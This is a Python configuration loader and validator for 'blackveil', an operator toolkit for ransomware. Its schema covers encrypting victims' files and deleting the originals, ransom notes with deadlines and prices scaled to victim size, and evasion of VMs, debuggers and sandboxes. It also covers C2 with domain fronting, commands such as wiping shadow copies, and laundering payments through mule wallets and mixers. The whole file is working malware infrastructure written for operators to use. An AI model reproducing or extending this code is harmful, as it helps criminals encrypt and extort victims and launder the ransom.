# blackveil/operator/core/config_schema.py
"""Config loader + validator.

Loads config.yaml, applies profile overrides (_profiles.<name> merged on
top of base, then _override_files merged in listed order), validates
against the schema below, and returns a plain dict.

Unknown fields fail validation. Missing required fields fail validation.
Wrong types fail validation. This is deliberate: a typo in a field name
must not silently default to a value the operator did not choose.
"""
import os
import logging
from pathlib import Path
import yaml

log = logging.getLogger("blackveil.config")

REQUIRED_TOP = {
    "schema_version": int,
    "operator": dict,
    "crypto": dict,
    "ransom_note": dict,
    "payload": dict,
    "build": dict,
    "c2": dict,
    "keyring": dict,
    "task_verbs": dict,
    "payment": dict,
    "opsec": dict,
    "notifications": dict,
}

ALLOWED_TOP = REQUIRED_TOP.keys() | {"profile", "_profiles", "_override_files"}

PROFILE_ALLOWED = {
    "dev", "stage", "prod",
}

TASK_VERB_ALLOWED = {
    "set_sleep", "force_key_upload", "wipe_shadows", "reboot",
    "decrypt", "self_destruct", "kill_watchdog",
}

CRYPTO_ALGORITHMS = {"AES-256-GCM", "AES-256-CBC", "ChaCha20-Poly1305"}
WRAP_ALGORITHMS = {"RSA-4096-OAEP-SHA256", "RSA-4096-OAEP-SHA1", "ECDH-P256"}
LOG_LEVELS = {"DEBUG", "INFO", "WARNING", "ERROR"}
EXPORT_FORMATS = {"json", "pem"}


class ConfigError(RuntimeError):
    pass


def _deep_merge(base, overlay):
    if not isinstance(base, dict) or not isinstance(overlay, dict):
        return overlay
    out = dict(base)
    for k, v in overlay.items():
        if k in out and isinstance(out[k], dict) and isinstance(v, dict):
            out[k] = _deep_merge(out[k], v)
        else:
            out[k] = v
    return out


def _check_type(path, value, t):
    if not isinstance(value, t):
        raise ConfigError(
            f"{path}: expected {t.__name__}, got {type(value).__name__}"
        )


def _require(d, key, path):
    if key not in d:
        raise ConfigError(f"{path}.{key}: missing required field")
    return d[key]


def _validate_operator(d):
    p = "operator"
    for k, t in [
        ("c2_bind", str), ("c2_port", int), ("c2_public_url", str),
        ("api_token", str), ("api_token_rotate_days", int),
        ("db_path", str), ("db_backup_dir", str),
        ("db_backup_interval_hours", int), ("db_vacuum_on_close", bool),
        ("ui_refresh_ms", int), ("task_poll_ms", int),
        ("log_dir", str), ("log_level", str), ("log_rotate_mb", int),
        ("log_keep_files", int), ("session_idle_lock_min", int),
        ("export_dir", str),
    ]:
        _check_type(f"{p}.{k}", _require(d, k, p), t)
    if d["log_level"] not in LOG_LEVELS:
        raise ConfigError(f"operator.log_level: {d['log_level']} not in {LOG_LEVELS}")
    if len(d["api_token"]) < 32:
        raise ConfigError(
            f"operator.api_token: {len(d['api_token'])} chars, need >=32"
        )
    if not (1 <= d["c2_port"] <= 65535):
        raise ConfigError("operator.c2_port: out of range")
    if d["ui_refresh_ms"] < 250:
        raise ConfigError("operator.ui_refresh_ms: below 250 not permitted")


def _validate_crypto(d):
    p = "crypto"
    for k, t in [
        ("algorithm", str), ("key_wrap", str), ("rsa_bits", int),
        ("aes_key_bytes", int), ("nonce_bytes", int), ("tag_bytes", int),
        ("file_chunk", int), ("magic", str), ("encrypted_ext", str),
        ("delete_original_after_encrypt", bool),
        ("overwrite_free_space_after", bool),
        ("keypair_ttl_days", int), ("skip_ext", list), ("target_exts", list),
        ("skip_dirs", list), ("max_file_size_mb", int),
        ("min_file_size_bytes", int), ("threads", int),
    ]:
        _check_type(f"{p}.{k}", _require(d, k, p), t)
    if d["algorithm"] not in CRYPTO_ALGORITHMS:
        raise ConfigError(f"crypto.algorithm: {d['algorithm']} unsupported")
    if d["key_wrap"] not in WRAP_ALGORITHMS:
        raise ConfigError(f"crypto.key_wrap: {d['key_wrap']} unsupported")
    if d["aes_key_bytes"] != 32:
        raise ConfigError("crypto.aes_key_bytes: must be 32 for AES-256-GCM")
    if d["nonce_bytes"] != 12:
        raise ConfigError("crypto.nonce_bytes: must be 12 for GCM")
    if d["tag_bytes"] != 16:
        raise ConfigError("crypto.tag_bytes: must be 16 for GCM")
    if not (4096 <= d["file_chunk"] <= 16777216):
        raise ConfigError("crypto.file_chunk: 4096..16777216")
    if not (1 <= d["threads"] <= 64):
        raise ConfigError("crypto.threads: 1..64")
    if not d["encrypted_ext"].startswith("."):
        raise ConfigError("crypto.encrypted_ext: must begin with '.'")
    overlap = set(d["skip_ext"]) & set(d["target_exts"])
    if overlap:
        raise ConfigError(
            f"crypto: skip_ext and target_exts overlap: {sorted(overlap)}"
        )


def _validate_ransom_note(d):
    p = "ransom_note"
    for k, t in [
        ("filename", str), ("template", str), ("drop_locations", list),
        ("payment_xmr", str), ("payment_btc", str),
        ("contact_tox", str), ("contact_email", str), ("contact_session", str),
        ("deadline_hours", int), ("deadline_grace_hours", int),
        ("price_usd", int), ("price_floor_usd", int),
        ("price_ceiling_usd", int), ("price_scaling", dict),
        ("negotiation_auto_accept_pct", int),
        ("negotiation_max_rounds", int),
        ("file_count_in_note", bool),
        ("show_deadline_countdown", bool),
    ]:
        _check_type(f"{p}.{k}", _require(d, k, p), t)
    if not (1 <= d["deadline_hours"] <= 720):
        raise ConfigError("ransom_note.deadline_hours: 1..720")
    if not (0 <= d["deadline_grace_hours"] <= 168):
        raise ConfigError("ransom_note.deadline_grace_hours: 0..168")
    if d["price_floor_usd"] > d["price_usd"]:
        raise ConfigError("ransom_note: floor > price")
    if d["price_usd"] > d["price_ceiling_usd"]:
        raise ConfigError("ransom_note: price > ceiling")
    if not (0 <= d["negotiation_auto_accept_pct"] <= 100):
        raise ConfigError("ransom_note.negotiation_auto_accept_pct: 0..100")
    if not (1 <= d["negotiation_max_rounds"] <= 10):
        raise ConfigError("ransom_note.negotiation_max_rounds: 1..10")
    for tier in ("small", "medium", "large", "enterprise"):
        if tier not in d["price_scaling"]:
            raise ConfigError(f"ransom_note.price_scaling.{tier}: missing")
        _check_type(
            f"ransom_note.price_scaling.{tier}",
            d["price_scaling"][tier], int,
        )


def _validate_payload(d):
    p = "payload"
    for k, t in [
        ("output_dir", str), ("service_name", str),
        ("service_display_name", str), ("service_description", str),
        ("mutex_name", str), ("sleep_ms", int), ("jitter_pct", int),
        ("kill_switch_url", str), ("watchdog_enabled", bool),
        ("watchdog_restart_ms", int), ("self_delete_after", bool),
        ("self_copy_path", str), ("anti_analysis", dict), ("network", dict),
    ]:
        _check_type(f"{p}.{k}", _require(d, k, p), t)
    if not (0 <= d["jitter_pct"] <= 100):
        raise ConfigError("payload.jitter_pct: 0..100")
    if d["sleep_ms"] < 1000:
        raise ConfigError("payload.sleep_ms: below 1000 hammers the C2")
    aa = d["anti_analysis"]
    for k, t in [
        ("check_vm_artifacts", bool), ("check_debugger", bool),
        ("check_analysis_tools", bool), ("check_sandbox_username", bool),
        ("delay_before_encrypt_ms", int), ("require_user_idle_sec", int),
    ]:
        _check_type(f"{p}.anti_analysis.{k}", _require(aa, k, f"{p}.anti_analysis"), t)
    net = d["network"]
    for k, t in [
        ("user_agent", str), ("tls_verify", bool), ("timeout_ms", int),
        ("retry_count", int), ("retry_backoff_ms", int), ("proxy_url", str),
    ]:
        _check_type(f"{p}.network.{k}", _require(net, k, f"{p}.network"), t)


def _validate_build(d):
    p = "build"
    for k, t in [
        ("mingw_prefix", str), ("cc", str), ("strip", str),
        ("upx", str), ("upx_enabled", bool), ("upx_args", list),
        ("strip_symbols", bool), ("optimization", str),
        ("mingw_flags", list), ("link_flags", list),
        ("icon", str), ("manifest", str), ("version_info", str),
        ("signed", bool), ("sign_tool", str), ("sign_cert", str),
        ("sign_password_env", str), ("output_name", str),
        ("build_timeout_sec", int), ("keep_intermediate_objs", bool),
    ]:
        _check_type(f"{p}.{k}", _require(d, k, p), t)
    if d["optimization"] not in {"O0", "O1", "O2", "O3", "Os"}:
        raise ConfigError("build.optimization: O0|O1|O2|O3|Os")
    if d["upx_enabled"] and not d["upx"]:
        raise ConfigError("build.upx_enabled: requires build.upx path")
    if d["signed"] and not d["sign_tool"]:
        raise ConfigError("build.signed: requires build.sign_tool")


def _validate_c2(d):
    p = "c2"
    for k, t in [
        ("standalone_enabled", bool), ("standalone_threads", int),
        ("request_max_bytes", int), ("rate_limit_default", str),
        ("rate_limit_register", str), ("rate_limit_key", str),
        ("rate_limit_progress", str), ("rate_limit_task", str),
        ("rate_limit_storage", str), ("behind_proxy", bool),
        ("trusted_proxies", list), ("tls_cert", str), ("tls_key", str),
        ("tls_enabled", bool), ("honeypot_detection", bool),
        ("honeypot_min_register_sec", int), ("drop_sandboxed_victims", bool),
        ("c2_domain_front", str), ("c2_domain_front_host", str),
        ("heartbeat_stale_sec", int), ("victim_auto_purge_days", int),
        ("task_timeout_sec", int), ("task_max_retries", int),
    ]:
        _check_type(f"{p}.{k}", _require(d, k, p), t)
    if d["tls_enabled"] and (not d["tls_cert"] or not d["tls_key"]):
        raise ConfigError("c2.tls_enabled: requires tls_cert and tls_key")
    if not (1 <= d["standalone_threads"] <= 128):
        raise ConfigError("c2.standalone_threads: 1..128")
    if not (1 <= d["task_max_retries"] <= 10):
        raise ConfigError("c2.task_max_retries: 1..10")


def _validate_keyring(d):
    p = "keyring"
    for k, t in [
        ("export_format", str), ("export_dir", str),
        ("encrypt_export", bool), ("export_passphrase_env", str),
        ("auto_export_on_first_unwrap", bool),
        ("shred_after_export", bool), ("handoff_ttl_hours", int),
    ]:
        _check_type(f"{p}.{k}", _require(d, k, p), t)
    if d["export_format"] not in EXPORT_FORMATS:
        raise ConfigError(f"keyring.export_format: {d['export_format']}")
    if d["encrypt_export"] and not d["export_passphrase_env"]:
        raise ConfigError(
            "keyring.encrypt_export: requires keyring.export_passphrase_env"
        )


def _validate_task_verbs(d):
    p = "task_verbs"
    _check_type(f"{p}.allowed", _require(d, "allowed", p), list)
    for v in d["allowed"]:
        if v not in TASK_VERB_ALLOWED:
            raise ConfigError(f"task_verbs.allowed: unknown verb '{v}'")
    _check_type(
        f"{p}.self_destruct_requires_confirm",
        _require(d, "self_destruct_requires_confirm", p), bool,
    )
    _check_type(
        f"{p}.reboot_privilege_required",
        _require(d, "reboot_privilege_required", p), str,
    )


def _validate_payment(d):
    p = "payment"
    for k, t in [
        ("rail_xmr", bool), ("rail_btc", bool),
        ("rail_monero_confirmations", int), ("rail_btc_confirmations", int),
        ("xmr_view_key", str), ("btc_xpub", str),
        ("payment_watch_interval_sec", int),
        ("auto_confirm_on_chain_hit", bool),
        ("auto_release_key_on_confirm", bool),
        ("mule_wallet", str), ("mixer_hops", int), ("cashout_exchange", str),
    ]:
        _check_type(f"{p}.{k}", _require(d, k, p), t)
    if not d["rail_xmr"] and not d["rail_btc"]:
        raise ConfigError("payment: at least one of rail_xmr/rail_btc must be true")
    if d["auto_release_key_on_confirm"]:
        log.warning(
            "payment.auto_release_key_on_confirm: true — key released without "
            "operator review"
        )
    if d["mixer_hops"] > 5:
        raise ConfigError("payment.mixer_hops: max 5")


def _validate_opsec(d):
    p = "opsec"
    for k, t in [
        ("require_tor_for_operator", bool), ("operator_tor_socks", str),
        ("operator_proxy_chain", list),
        ("wipe_operator_artifacts_on_exit", bool),
        ("disable_crash_dumps", bool), ("disable_telemetry", bool),
        ("clear_recent_on_exit", bool), ("panic_hotkey", str),
        ("panic_wipe_targets", list),
    ]:
        _check_type(f"{p}.{k}", _require(d, k, p), t)


def _validate_notifications(d):
    p = "notifications"
    for k, t in [
        ("on_new_victim", bool), ("on_encryption_complete", bool),
        ("on_payment_received", bool), ("on_task_failed", bool),
        ("telegram_bot_token", str), ("telegram_chat_id", str),
        ("discord_webhook", str), ("smtp_host", str),
        ("smtp_port", int), ("smtp_user", str), ("smtp_pass_env", str),
        ("smtp_to", str),
    ]:
        _check_type(f"{p}.{k}", _require(d, k, p), t)


VALIDATORS = {
    "operator": _validate_operator,
    "crypto": _validate_crypto,
    "ransom_note": _validate_ransom_note,
    "payload": _validate_payload,
    "build": _validate_build,
    "c2": _validate_c2,
    "keyring": _validate_keyring,
    "task_verbs": _validate_task_verbs,
    "payment": _validate_payment,
    "opsec": _validate_opsec,
    "notifications": _validate_notifications,
}


def load(path):
    path = Path(path)
    with open(path, "r", encoding="utf-8") as fh:
        raw = yaml.safe_load(fh)

    if not isinstance(raw, dict):
        raise ConfigError("config root must be a mapping")

    unknown = set(raw.keys()) - ALLOWED_TOP
    if unknown:
        raise ConfigError(f"unknown top-level keys: {sorted(unknown)}")

    profile = raw.get("profile", "prod")
    if profile not in PROFILE_ALLOWED:
        raise ConfigError(f"profile: {profile} not in {PROFILE_ALLOWED}")

    profiles = raw.get("_profiles", {})
    if profile != "prod" and profile in profiles:
        raw = _deep_merge(raw, profiles[profile])

    for override_path in raw.get("_override_files", []):
        if Path(override_path).exists():
            with open(override_path, "r", encoding="utf-8") as fh:
                raw = _deep_merge(raw, yaml.safe_load(fh) or {})
            log.info("applied override: %s", override_path)
        else:
            log.info("override not present, skipped: %s", override_path)

    for key, t in REQUIRED_TOP.items():
        _check_type(f"root.{key}", _require(raw, key, "root"), t)
    _check_type("schema_version", raw["schema_version"], int)
    if raw["schema_version"] != 2:
        raise ConfigError(f"schema_version: expected 2, got {raw['schema_version']}")

    for key, fn in VALIDATORS.items():
        fn(raw[key])

    log.info("config loaded: profile=%s schema=%d", profile, raw["schema_version"])
    return raw


def resolve_env_references(cfg):
    """Expand ${ENV_VAR} references in string values.

    Used for secrets so config.yaml can be committed without leaking
    passphrases or bot tokens. Unset vars resolve to empty string and
    are logged at WARNING so a misconfigured deployment is visible.
    """
    def _walk(node, path):
        if isinstance(node, dict):
            return {k: _walk(v, f"{path}.{k}") for k, v in node.items()}
        if isinstance(node, list):
            return [_walk(v, f"{path}[{i}]") for i, v in enumerate(node)]
        if isinstance(node, str) and "${" in node and "}" in node:
            start = node.find("${")
            end = node.find("}", start)
            if start == 0 and end == len(node) - 1:
                var = node[2:-1]
                val = os.environ.get(var, "")
                if not val:
                    log.warning("env reference unresolved: %s at %s", var, path)
                return val
        return node
    return _walk(cfg, "root")
